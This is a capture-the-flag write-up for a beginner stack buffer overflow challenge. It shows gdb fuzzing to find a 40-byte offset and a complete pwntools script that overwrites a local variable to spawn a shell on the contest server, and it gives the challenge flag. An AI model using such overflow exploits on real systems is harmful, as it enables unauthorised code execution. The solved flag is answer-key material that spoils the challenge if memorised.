# beginner-generic-pwn-number-0

<p align="center">
    <kbd><img src="images/pwn0-1.png" caption="Challenge" /></kbd><br/>
</p>

From the source code, I understand that I need to modify the value of inspirational_message_index to -1 (0xffffffff) in order to spawn a shell.

<p align="center">
    <kbd><img src="images/pwn0-2.png" caption="Challenge" /></kbd><br/>
</p>

The program compares `rbp-0x8` with 0xffffffffffffffff

<p align="center">
    <kbd><img src="images/pwn0-3.png" caption="Challenge" /></kbd><br/>
</p>

To start, perform fuzzing <br />
`$ pattern_create 48` <br />
<p align="center">
    <kbd><img src="images/pwn0-4.png" caption="Challenge" /></kbd><br/>
</p>

View registers <br />
`$ info registers` <br />
<p align="center">
    <kbd><img src="images/pwn0-5.png" caption="Challenge" /></kbd><br/>
</p>

Print the value stored on `rdp-0x8` <br />
`$ p *0x7fffffffdfc8`
<p align="center">
    <kbd><img src="images/pwn0-6.png" caption="Challenge" /></kbd><br/>
</p>

`$ pattern_offset 0x41304141` <br />
<p align="center">
    <kbd><img src="images/pwn0-7.png" caption="Challenge" /></kbd><br/>
</p>

So, I need to spray 40 random characters and then provide 0xffffffffffffffff to modify the value of inspirational_message_index variable.

I created a script to perform our exploit.

```
from pwn import *

input = "A"*40 + "\xff\xff\xff\xff\xff\xff\xff\xff"


p = remote("mc.ax", 31199) 
#p = process("./beginner-generic-pwn-number-0")
p.recvuntil("cheer me up")
p.sendline(input)
p.interactive()
```

Run the exploit <br />
`$ python3 exploit.py` <br />
<p align="center">
    <kbd><img src="images/pwn0-8.png" caption="Challenge" /></kbd><br/>
</p>

Flag: `flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}`